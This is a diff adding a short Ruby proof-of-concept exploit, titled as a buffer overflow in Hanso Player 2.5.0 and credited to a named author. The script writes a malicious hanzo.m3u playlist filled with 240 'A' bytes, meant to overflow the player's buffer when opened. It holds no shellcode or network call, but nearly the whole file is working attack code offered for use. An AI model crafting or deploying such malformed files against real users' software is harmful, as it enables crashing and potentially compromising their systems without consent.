@@ -1,0 +1,15 @@
+#!/usr/bin/env ruby
+# coding:UTF-8
+# Exploit Title:Hanso Player 2.5.0 Buffer Overflow
+# Author:Necmettin COSKUN => twitter.com/babayarisi
+# Vendor :www.hansotools.com
+# Software link:http://www.hansotools.com/downloads/hanso-player-setup.exe
+# version: 2.5.0
+# Tested on: windows XP sp2
+
+DENEME = "\x41" * 240
+
+File.open('hanzo.m3u', 'w') do |bofdosya|  
+bofdosya.puts (DENEME)
+bofdosya.close()
+end
